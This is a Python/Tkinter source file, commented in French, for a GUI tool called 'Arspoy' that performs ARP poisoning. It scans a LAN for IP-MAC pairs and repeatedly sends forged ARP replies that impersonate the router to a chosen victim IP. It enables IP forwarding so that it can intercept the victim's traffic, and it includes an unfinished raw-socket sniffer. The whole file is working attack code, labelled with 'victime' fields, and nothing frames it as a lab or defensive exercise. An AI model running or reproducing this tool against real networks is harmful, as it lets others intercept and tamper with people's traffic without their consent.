#coding: utf8
#Script d'ARPPoisonning
#Auteur:Benjamin CAILLARD
from Tkinter import *
from threading import *
from scapy.all import *
import time,socket,os,sched,socket,sys



class GUI(Tk):
	def __init__(self, **kwargs):
		Tk.__init__(self, **kwargs)
		#Parametre generaux
		self.title("Arspoy")
		self.geometry('720x450')
		#Form1
		self.lbldesc = Label(self, text="\\\_A_R_S_P_O_Y_//").grid(row=0,column=2,columnspan=5)
		self.lbl0 = Label(self, text="########################").grid(row=1,column=0,columnspan=2)
		self.lbldparam = Label(self, text="Paramètres:").grid(row=2,column=0,columnspan=2)
		self.lbl1 = Label(self, text="########################").grid(row=3,column=0,columnspan=2)
		self.lblrtr = Label(self, text="IP du routeur").grid(row=4,column=0,columnspan=2)
		self.rtr = StringVar()	
		self.inprtr = Entry(self, textvariable=self.rtr,width=30).grid(row=5,column=0,columnspan=2)
		self.lbl2 = Label(self, text="########################").grid(row=6,column=0,columnspan=2)
		self.lblvct = Label(self, text="IP de la victime").grid(row=7,column=0,columnspan=2)	
		self.vtc = StringVar()		
		self.inpvtc = Entry(self,textvariable=self.vtc ,width=30).grid(row=8,column=0,columnspan=2)
		self.lbl5 = Label(self, text="########################").grid(row=9,column=0,columnspan=2)
		self.lbl7 = Label(self, text="Durée(0 infini)").grid(row=10,column=0,columnspan=2)
		self.date = IntVar()			
		self.inpdate = Entry(self, textvariable=self.date,width=30).grid(row=11,column=0,columnspan=2)
		self.lbl5 = Label(self, text="########################").grid(row=12,column=0,columnspan=2)
		self.lbl6 = Label(self, text="Activation IPForwarding (defaut : Activer)").grid(row=13,column=0,columnspan=2)
		self.rdbvar = StringVar()
		Radiobutton(self, text="Activer", variable=self.rdbvar, value="y").grid(row=14,column=0)
		Radiobutton(self, text="Désactiver", variable=self.rdbvar, value="n").grid(row=14,column=1)
		self.lbl3 = Label(self, text="|     |     |     |").grid(row=15,column=0,columnspan=2)
		self.btncheck = Button(self, text='Lancer',command=self.go,height=1, width=10).grid(row=16,column=0,ipady=3)
		self.btnstp = Button(self, text='Stop',command=self.stop,height=1, width=10).grid(row=16,column=1,ipady=3)
		self.lbl8var = StringVar()
		self.lbl8 = Label(self, textvariable=self.lbl8var).grid(row=18,column=0,columnspan=2,ipady=6)
		self.lbl8var.set("")
		#Form2
		self.lbl4 = Label(self, text="Adresse réseau local (10.0.0.0/24)").grid(row=2,column=3)
		self.kall = StringVar()
		self.inpkall = Entry(self, textvariable=self.kall,width=40).grid(row=3,column=3)
		self.btnkall = Button(self, text='Scan',command=self.scanevent,height=1, width=10).grid(row=4,column=3)
		self.V_lstscn = StringVar()
		self.lstscn = Listbox(self, listvariable=self.V_lstscn,width=40,height=15).grid(row=5,column=3,rowspan=12)
		self.V_lbl9 = StringVar()
		self.lbl9 = Label(self, textvariable=self.V_lbl9).grid(row=18,column=3)
		self.V_lbl9.set("Aucun scan effectuer")
		#Form3
		self.lbl4 = Label(self, text="Prochainement sniffer de LAN").grid(row=2,column=6,columnspan=2)
		#self.lbl4 = Label(self, text="Sniffeur de LAN").grid(row=2,column=4)
		#self.V_lstsnff = StringVar()
		#self.lstsnff = Listbox(self, listvariable=self.V_lstsnff,width=40,height=15).grid(row=3,column=4,rowspan=10)
		#self.btnkall = Button(self, text='Sniffer',command=self.sniffing,height=1, width=10).grid(row=12,column=4)
	def go(self):#fonction du bouton lancer
		self.thread1 = Thread(target=self.cmmd)
		self.thread1.start()
	def scanevent(self):
		self.thread2 = Thread(target=self.scan)
		self.thread2.start()
	def sniffing(self):#ecoute du réseau (en test)
		scksnff = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
		while True:
			print scksnff.recvfrom(65565)
	def scan(self):#scan du réseau
		self.V_lbl9.set(" ")
		self.lstttl = ""
		self.V_lbl9.set("Scan en cours...")
		self.Macaddrbroadcast(self.kall.get())
		self.V_lbl9.set("Fin du scan (scroller pour plus de details)")
	def stop(self):#stop l'arp poisonning
		self.endwhl = "END"
	def cmmd(self):#lancement des tâches
		self.endwhl = "NOTEND"
		self.V_macvtc = self.Macaddr(self.vtc.get())
		self.lbl8var.set("Vérification de la victime : "+ str(self.V_macvtc))
		self.V_timer = self.timerspoof(self.date.get())
		#self.F_ipforw(self.rdbvar.get())
		#self.thread1 = Thread(target=
		self.F_Go(self.V_timer[1],self.vtc.get(),self.rtr.get(),self.V_macvtc)#)
		#self.thread1.start()
	def F_Go(self,timerend,V_targ,V_gateway,Mac_targ):#boucle de l'arp poisonning
		timer = time.time()
		timi = self.date.get() - 1
		V_timerdisp = timerend - timi
		self.lbl8var.set("Usurpation sur "+ V_targ + " temps restant : "+ str(timi))
		while timer < timerend:
			respreq = self.arpreq(V_targ,V_gateway,Mac_targ)
			print str(timer) + " "+str(timerend)
			if self.endwhl == "END":
				break
			if timer > V_timerdisp:
				timi -= 1
				V_timerdisp = timerend - timi
				self.lbl8var.set("Usurpation sur "+ V_targ + " temps restant : "+ str(timi))
			timer = time.time()
		self.F_ipforw("n")
	def Macaddr(self,ip):#recuperation de l'adresse MAC
		try:
			ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=0)
			for s,r in ans:
				return r.sprintf("%Ether.src%")
		except:
			self.lbl8var.set("Erreur l'adresse " + ip + " n'est pas disponible")
			pass
	def Macaddrbroadcast(self,ip):#scan du reseau IP x MAC
		ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(ip)), timeout=2, retry=0)
		for s,r in ans:
			self.lstttl = self.lstttl + r.sprintf(r"%ARP.psrc%==%Ether.src% ")
		self.V_lstscn.set(self.lstttl)
	def timerspoof(self,date):#delai d'arp poisonning
		timer = time.time()
		if date == "0":
			timerend = time.time()+int(31536000) #1 an
		else:
			timerend = time.time()+int(date)
		return timer,timerend
	def F_ipforw(self,check): #Ipforwarding Linux
		if check == "" or check == "y":
			os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
		elif check == "n":
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		else:
			print "Commande invalide"
	def arpreq(self,victim,usurp,mac):#requete arp poisonning
		respreq = send(ARP(op=2, pdst=victim, psrc=usurp, hwdst=mac))
		return respreq
		
GUI().mainloop()
